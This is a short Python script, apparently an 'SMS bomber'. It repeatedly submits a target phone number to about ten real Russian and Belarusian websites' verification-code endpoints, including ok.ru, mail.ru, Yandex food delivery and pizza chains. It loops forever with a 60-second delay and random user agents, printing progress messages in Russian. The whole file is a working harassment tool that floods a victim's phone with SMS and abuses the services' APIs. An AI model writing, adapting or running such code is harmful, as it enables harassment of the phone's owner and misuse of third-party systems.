import requests
from fake_useragent import UserAgent
import time


class SMSBomber:
	def __init__(self,number):
		self.number = number
		self.service = {
					  'https://youla.ru/web-api/auth/request_code' : {'data' : {'phone': number}},
					  'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' : {'data' : {'phone': number}},
					  'https://www.icq.com/smsreg/requestPhoneValidation.php' : {'data' : {'msisdn': number, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}},
					  'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone' : {'data' : {"st.r.phone": number}},
					  'https://cloud.mail.ru/api/v2/notify/applink' : {'data' : {"phone": number, "api": 2, "email": "email","x-email": "x-email"}},
					  'https://eda.yandex/api/v1/user/request_authentication_code' : {'json' : {"phone_number": number}},
					  'https://dodopizza.by/api/sendconfirmationcode' : {'data' : {'phoneNumber' : number}},
					  'https://www.slivki.by/login/send-code/' : {'get' : number},
					  'https://pizzasmile.by/' : {'data' : {'component' : ' bxmaker.authuserphone.login', 'sessid' : '7afa7030de05529fa57e471ca1353096', 'method' : 'sendCode', 'phone' : number, 'registration' : 'Y'}},
					  'https://delivio.by/be/api/register' : {'json' : {'phone' : number}},
					  }
		self.delay = 60

	def attack(self):
		print("Hello,it's Elizabeth!\nWith luvv from Belarus\nHappy New Year,bruh")

		user_agent = UserAgent().random
		headers = {'user_agent' : user_agent}
		iteration = 0

		while True:
			for key,value in self.service.items():
				for _type,meta in value.items():
					try:
						if _type == 'data':
							request = requests.post(key,
								   headers=headers,data=meta)
						elif _type == 'json':
							request = requests.post(key,
								   headers=headers,json=meta)
						elif _type == 'get':
							request = requests.get(key + self.number,headers=headers)
						print(f'[✔]{key.split("/")[2].title()} выполнен!')
					except:
						print(f'[✖]{key.split("/")[0]} не выполнен')
			# print(request.text) # FOR DEBUG
			iteration += 1
			print(f'{iteration} круг пройден')
			time.sleep(self.delay)

			

if __name__ == '__main__':
	number = input('Write your number : ')
	smsbomb = SMSBomber(number)
	smsbomb.attack()
